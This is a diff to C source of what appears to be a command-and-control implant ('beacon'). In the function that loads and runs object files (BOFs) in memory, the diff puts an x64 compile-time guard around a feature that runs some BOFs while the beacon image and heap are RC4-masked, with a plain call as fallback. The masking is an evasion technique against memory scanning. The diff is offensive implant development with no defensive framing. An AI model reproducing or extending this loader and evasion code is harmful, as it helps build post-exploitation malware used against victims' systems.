@@ -462,10 +462,12 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	SIZE_T total;
 	OBJ_RELOC * reloc;
 	BOOL success = FALSE;
+#if defined(_M_X64) && defined(BOFWIN_ENABLE)
 	BOOL beacon_api_used = FALSE; /* Phase 3: any ftable reloc means the BOF
 	                               * can call back into beacon .text - such a
 	                               * BOF may never run inside the masked
 	                               * window (13.11) */
+#endif
 	int how = 0;
 
 	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
@@ -591,7 +593,9 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				break;
 		}
 		else if (reloc->symbol >= 0 && reloc->symbol < 1024) {
+#if defined(_M_X64) && defined(BOFWIN_ENABLE)
 			beacon_api_used = TRUE;
+#endif
 			if (!process_reloc(reloc, src, dst, (char *)ftable + (reloc->symbol * sizeof(char *)), 0, base))
 				break;
 		}
@@ -668,6 +672,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
 			else {
+#if defined(_M_X64) && defined(BOFWIN_ENABLE)
 				/* Phase 3 masked BOF window (13.11): a Win32-only BOF (no
 				 * ftable relocations) runs with the full beacon image +
 				 * tracked heap RC4-masked. Lazy gparms init mirrors
@@ -684,6 +689,9 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				else {
 					inlinefunc(args, alen);
 				}
+#else
+				inlinefunc(args, alen);
+#endif
 			}
 		}
 	}
